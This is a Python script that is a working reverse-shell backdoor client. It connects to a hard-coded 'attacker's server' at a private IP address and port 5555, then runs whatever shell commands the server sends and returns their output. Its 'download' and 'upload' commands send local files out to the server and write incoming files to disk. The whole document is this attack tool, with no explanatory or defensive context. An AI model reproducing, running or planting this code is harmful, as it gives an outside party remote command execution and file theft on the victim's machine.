import socket
import subprocess

# Function to execute system commands
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output  # Capture error if command fails
    return output

# Function to receive a file from the server
def receive_file(client_socket, file_name):
    with open(file_name, 'wb') as f:
        while True:
            file_data = client_socket.recv(1024)
            if not file_data:
                break
            f.write(file_data)
    print(f"File {file_name} received successfully.")

# Function to send a file to the server
def send_file(client_socket, file_name):
    with open(file_name, 'rb') as f:
        while True:
            file_data = f.read(1024)
            if not file_data:
                break
            client_socket.send(file_data)
    print(f"File {file_name} sent successfully.")

# Connect to the attacker's server
def connect_to_server(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print(f"Connected to server at {server_ip}:{server_port}")
    return client

# Main client logic
client_socket = connect_to_server('192.168.43.123', 5555)

# Communication loop
while True:
    command = client_socket.recv(1024).decode()  # Receive command from server

    if command.lower() == "exit":
        print("Closing connection")
        break

    elif command.startswith('download'):
        _, file_name = command.split()  # Extract the file name
        send_file(client_socket, file_name)

    elif command.startswith('upload'):
        _, file_name = command.split()  # Extract the file name
        receive_file(client_socket, file_name)

    else:
        output = execute_command(command)
        client_socket.send(output.encode())

# Close the socket
client_socket.close()
